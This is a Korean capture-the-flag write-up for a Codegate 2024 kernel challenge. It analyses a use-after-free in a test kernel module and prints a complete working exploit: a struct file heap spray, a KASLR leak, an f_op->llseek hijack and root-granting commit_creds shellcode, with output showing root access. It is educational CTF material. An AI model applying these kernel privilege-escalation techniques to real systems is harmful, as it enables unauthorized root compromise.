# 🚩 PWN - PhysicalTest

키워드: UAF, file_struct, page, shellcode

## **📌** 문제 개요

본 문제는 전형적인 커널 익스플로잇 문제로, **Use-After-Free(UAF)**와 전역 변수 관리 부실로 인한 **VMA 충돌** 취약점을 이용하여 커널 메모리를 임의로 조작하고 권한을 상승시키는 것이 목표입니다.

## **📌** 코드 분석

커널 모듈 `test.ko`는 `/dev/test` 디바이스를 통해 다음과 같은 동작을 수행합니다:

- **open:** `alloc_pages`를 이용해 총 4개의 물리 페이지(A, B, C, D)를 할당합니다. 이 중 B, C, D는 0으로 초기화되며 D에는 문자열 `{codegate2024}`가 기록됩니다.
- **read:** 페이지 C의 내용을 유저 공간으로 복사합니다.
- **mmap:** A, B, C 페이지를 0x3000 크기의 영역으로 유저 공간에 매핑합니다. 이 매핑의 VMA는 전역 변수 `backing_vma`에 저장되며, 이후의 `mmap` 호출 시 이를 덮어씁니다.
- **write:** 최대 0x700 바이트까지 입력된 데이터를 B에 복사한 뒤, 편집 거리(edit distance)를 계산하여 C와 비교합니다. 이 길이가 0x700을 초과하면 A, B, C 페이지를 해제하고 `backing_vma` 영역도 `zap_vma_ptes()`로 초기화합니다.
- **release:** 모든 페이지(A, B, C, D)를 해제하고 `backing_vma`를 정리합니다.

## **📌** 취약점 분석

문제에서 제공된 커널 모듈 `test.ko`는 캐릭터 디바이스 드라이버이며, 핵심 취약점은 다음 두 함수에서 발생합니다.

### 1. my_mmap()

```c
__int64 __fastcall my_mmap(__int64 filp, __int64 vma)
{
    //...
    backing_vma = vma;  // 전역 변수에 저장됨
    return 0LL;
}
```

- 전역 변수 `backing_vma`에 VMA 주소를 저장합니다.
- 파일 디스크립터마다 별도의 VMA가 존재하지만, 이를 하나의 전역 변수로 관리하여 **서로의 매핑 정보가 덮어쓰이게 됩니다.**
    - fd → fd2 순으로 파일 디스크립터를 open하면 `backing_vma`에는 fd2의 VMA가 저장됨.

### 2. my_write()

```c
__int64 __fastcall my_write(__int64 filp, __int64 usr_buf, unsigned __int64 size)
{
    //...
    for (int i = 2; i >= 0; --i) {
        _free_pages(ctx[i], 0LL);
        ctx[i] = 0LL;
    }

    if (backing_vma) {
        zap_vma_ptes(backing_vma, *(_QWORD*)backing_vma, 12288LL);
        backing_vma = 0LL;
    }
    //...
}
```

- 특정 조건(size > 0x700)을 만족하면 매핑된 페이지를 해제하고 `backing_vma`를 초기화합니다.
- 이때 전역 변수 관리 미흡으로 인해 **다른 fd의 VMA**를 해제하게 되며, 정작 호출한 fd의 매핑은 UAF 상태로 남게 됩니다.
    - fd → fd2 순으로 open하고 fd를 해제하면 전역변수 backing_vma에는 fd2의 VMA가 저장된 상태이므로 fd의 VMA가 아닌 fd2의 VMA가 해제됨.
    - 따라서 fd의 VMA를 통해 fd의 해제된 page에 접근 가능함.

결과적으로, 두 fd 사이의 **전역 변수 공유**로 인해 **Use-After-Free 취약점**이 유발됩니다.

## **📌** 공격 시나리오

각 단계는 exploit.c 코드와 함께 구체적인 설명을 포함하고 있습니다.

1. `/dev/test` 디바이스를 두 번 열고 각각 매핑(mmap)을 수행합니다.
    
    ```c
    int fd = open("/dev/test", O_RDWR);
    int fd2 = open("/dev/test", O_RDWR);
    
    unsigned char *a = mmap(0, 0x3000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);
    mmap(0, 0x3000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd2, 0);
    ```
    
    - 두 개의 파일 디스크립터 `fd`, `fd2`를 열어 각기 다른 커널 컨텍스트를 할당받습니다.
    - 각각 `mmap`을 호출하면 내부적으로 `my_mmap()`이 호출되어 전역 변수 `backing_vma`가 갱신되며, 결국 fd2 호출로 덮어씌워지게 됩니다.
        - backing_vma는 fd2의 VMA를 가짐.
2. `write`를 통해 fd의 페이지를 해제하면 fd2의 VMA가 해제됩니다.
    
    ```c
    memset(a, 0x0, 0x3000);
    memset(a + 0x1000, 0xcc, 0x1000);
    write(fd, "a", 1);
    ```
    
    - `my_write()`에서는 0x700 바이트 초과 입력 시 페이지를 해제하고 `zap_vma_ptes()`를 호출합니다.
    - 하지만 `backing_vma`는 `fd2`에 해당하는 VMA를 가리키고 있으므로 `fd2`의 매핑이 정리됩니다.
    - 반면, `fd`는 실제로 페이지가 해제되었지만 여전히 mmap 영역으로 접근 가능해 UAF가 발생합니다.
3. fd의 mmap된 메모리는 여전히 접근 가능하지만, 실제 페이지는 free된 상태입니다.
    - 이 상태에서 페이지가 커널에 의해 재사용되면 해당 영역을 유저 공간에서 읽고 쓸 수 있게 됩니다.
4. 이 상태에서 커널 객체(예: `struct file`)를 스프레이하여 free된 페이지에 재할당받습니다.
    
    ```c
    int fds[0x100];
    for (int i = 0; i < 0x100; i++)
        fds[i] = open("/dev/urandom", O_RDONLY);
    ```
    
    - `/dev/urandom` 파일을 다수 열어 해제된 페이지가 `struct file` 구조체를 할당하도록 유도합니다.
    - 페이지 재사용으로 인해 방금 해제된 영역에 `file` 구조체가 들어갈 가능성이 높아집니다.
5. 유저 공간에서는 이를 통해 커널 객체를 읽고 쓰며 커널 주소를 누수하고 함수 포인터를 덮어씁니다.
    
    ```c
    unsigned long *ax = (unsigned long *)a;
    unsigned long file_base = 0, kernel_slide = 0;
    unsigned long *file_ax = 0;
    for (int i = 0; i < 0x3000; i += 0x1000) {
        if ((ax[(i + 0x30) >> 3] & 0xfff) == 0x30 &&
            (ax[(i + 0xb0) >> 3] & 0xfffff) == 0x91700) {
            file_base = ax[(i + 0x30) >> 3] - 0x30;
            file_ax = &ax[i >> 3];
            kernel_slide = ax[(i + 0xb0) >> 3] - 0x2291700L;
            break;
        }
    }
    ```
    
    - `struct file` 구조체는 내부에 `f_path.dentry`, `f_inode`, `f_op` 등의 필드를 포함하고 있으며, 이들을 기준으로 식별이 가능합니다.
    - 특히 `f_op`는 함수 포인터 테이블을 가리키며, 이 값이 커널 이미지의 슬라이드된 주소 영역(`ex. 0xffffffff81xxxxx`)에 위치함을 이용해 슬라이드를 계산할 수 있습니다.
        - 커널 슬라이드: 커널 베이스가 KASLR에 의해 얼마나 밀렸는지(offset)를 의미하며, 커널 베이스 주소 및 함수 주소를 계산하는데 사용됨.
        - `f_op`의 하위 20비트는 `0x91700`로 고정이므로 해당 값이 맞는지 확인 후 if 문 수행.
        - 만약, `f_op`에 저장된 값이 `0x3291700`이라고 가정하면 슬라이드는 `0x3291700 - 0x2291700 = 0x1000000`으로 계산됨.
6. 함수 포인터를 쉘코드 주소로 덮어써 루트 권한으로 상승합니다.
    
    ```c
    // 쉘코드 영역을 실행 가능한 상태로 조작
    file_ax[0x108 >> 3] = 0x107b800L + kernel_slide; // f_op->llseek 포인터를 set_memory_x 주소로 조작
    file_ax[0xb0 >> 3] = file_base + 0x100L; // 가짜 fops 주소 설정
    lseek(findfd, 1, SEEK_SET);
    
    // 쉘코드를 실행하도록 조작
    file_ax[0x108 >> 3] = file_base + 0x110L; // f_op->llseek 포인터를 쉘코드 영역으로 조작
    memcpy(&file_ax[0x110 >> 3], shellcode, sizeof(shellcode));
    memcpy((char *)&file_ax[0x110 >> 3] + sizeof(shellcode) - 9, &kernel_slide, 8);
    lseek(findfd, 1, SEEK_SET);
    ```
    
    - `f_op->llseek` 포인터를 먼저 `set_memory_x()`로 설정해 쉘코드 영역을 실행 가능하게 만든 후, 해당 포인터를 쉘코드 주소로 바꿉니다.
    - 이후 `lseek()` 호출로 해당 함수 포인터를 실행하게 하여 쉘코드를 실행하고 루트 권한을 획득합니다.

## **📌** 쉘코드

다음은 커널 모드에서 루트 권한을 획득하기 위해 사용된 쉘코드입니다. 이는 `commit_creds(prepare_kernel_cred(0))` 시퀀스를 실행하며, 쉘코드는 `llseek` 함수 포인터를 덮어쓴 후 실행됩니다.

```nasm
BITS 64

push rbx

mov rbx, [rel kernelbase]

lea rdi, [rbx+0x2a0c980] ; init_task
lea rax, [rbx+0x10bc400] ; prepare_kernel_cred
call rax

mov rdi, rax
lea rax, [rbx+0x10bc170] ; commit_creds
call rax

pop rbx
ret

kernelbase: dq 0x4141414141414141
```

이 쉘코드는 익스플로잇 코드에서 바이너리 형태로 삽입되며, 실행 시 현재 프로세스의 권한을 루트로 설정하게 됩니다.

## **📌** 익스플로잇

```c
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {
    char buf[4096];
    memset(buf, 0xcc, sizeof(buf));

    // 취약한 디바이스를 두 번 open
    int fd = open("/dev/test", O_RDWR);
    int fd2 = open("/dev/test", O_RDWR);

    // 두 fd로 mmap을 수행해 UAF 상황을 유도함
    unsigned char *a = mmap(0, 0x3000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);
    if (a == MAP_FAILED) {
        perror("mmap fd");
        exit(1);
    }
    if (mmap(0, 0x3000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd2, 0) == MAP_FAILED) {
        perror("mmap fd2");
        exit(1);
    }

    // 메모리 초기화 후 write를 통해 페이지 해제를 유도
    memset(a, 0x0, 0x3000);
    memset(a + 0x1000, 0xcc, 0x1000);
    if (write(fd, "a", 1) < 0) {
        perror("write");
        exit(1);
    }

    // 많은 수의 /dev/urandom 파일을 열어 file 구조체를 spray함
    int fds[0x100];
    for (int i = 0; i < 0x100; i++) {
        fds[i] = open("/dev/urandom", O_RDONLY);
        if (fds[i] < 0) {
            perror("open /dev/urandom");
            exit(1);
        }
    }

    unsigned long *ax = (unsigned long *)a;
    for (int i = 0; i < 0x3000; i += 8) {
        printf("%04x: 0x%lx\n", i >> 3, ax[i >> 3]);
    }

    // 해제된 영역에 재할당된 file 구조체를 찾아냄
    unsigned long file_base = 0;
    unsigned long *file_ax = 0;
    unsigned long kernel_slide = 0;

    for (int i = 0; i < 0x3000; i += 0x1000) {
        if (ax[(i + 0x30) >> 3] == ax[(i + 0x38) >> 3] &&
            (ax[(i + 0x30) >> 3] & 0xfff) == 0x30 &&
            (ax[(i + 0xb0) >> 3] & 0xfffff) == 0x91700) {
            file_base = ax[(i + 0x30) >> 3] - 0x30;
            file_ax = &ax[i >> 3];
            kernel_slide = ax[(i + 0xb0) >> 3] - 0x2291700L;
            break;
        }
    }

    if (!file_base) {
        fprintf(stderr, "failed to locate file struct\n");
        exit(1);
    }

    printf("file_base = %lx, kernel_slide = %lx\n", file_base, kernel_slide);

    // FMODE_READ 비트를 끄고 read 실패 여부로 spray된 file 구조체 찾기
    file_ax[0x10 >> 3] &= ~(1L << 32);
    int findfd = -1;
    for (int i = 0; i < 0x100; i++) {
        if (read(fds[i], buf, 1) < 0) {
            perror("read check");
            findfd = fds[i];
            break;
        }
    }

    if (findfd == -1) {
        fprintf(stderr, "failed to identify correct fd\n");
        exit(1);
    }

    printf("found fd = %d\n", findfd);

    // fops를 가짜 file_operations로 덮어쓸 준비
    char backup[0x100];
    memcpy(backup, &file_ax[0x100 >> 3], 0x100);

    file_ax[0x108 >> 3] = 0x107b800L + kernel_slide; // set_memory_x 함수 주소
    file_ax[0xb0 >> 3] = file_base + 0x100L;         // 가짜 fops 주소 설정

    // set_memory_x 호출로 쉘코드 공간을 실행 가능하게 변경
    if (lseek(findfd, 1, SEEK_SET) < 0) {
        perror("lseek set_memory_x");
        exit(1);
    }

    // llseek을 쉘코드 주소로 덮어쓰기
    file_ax[0x108 >> 3] = file_base + 0x110L;

    const char shellcode[] = "SH\213\35\36\0\0\0H\215\273\200\311\240\2H\215\203\0\304\v\1\377\320H\211\307H\215\203p\301\v\1\377\320[\303AAAAAAAA";
    memcpy(&file_ax[0x110 >> 3], shellcode, sizeof(shellcode));
    memcpy((char *)&file_ax[0x110 >> 3] + sizeof(shellcode) - 9, &kernel_slide, 8);

    printf("executing shellcode!\n");

    // lseek을 다시 호출해 쉘코드 실행 트리거
    if (lseek(findfd, 1, SEEK_SET) < 0) {
        perror("lseek shellcode");
        exit(1);
    }

    // fops 복구 후 루트 쉘 실행
    file_ax[0xb0 >> 3] = 0x2291700L + kernel_slide;
    system("/bin/sh");

    return 0;
}
```

```bash
~ $ id
uid=1000 gid=1000 groups=1000
~ $ cat /flag
cat: can't open '/flag': Permission denied
~ $ /exp
...
...
...
file_base = ffff9c6ec1bc5000, kernel_slide = ffffffffbc200000
read check: Bad file descriptor
found fd = 46
executing shellcode!
~ # id
uid=0 gid=0
~ # cat /flag
codegate2024{d4dc41e3e537cfadafcac5972701aa473a7feb8494964015d3253911106ab0a}
```
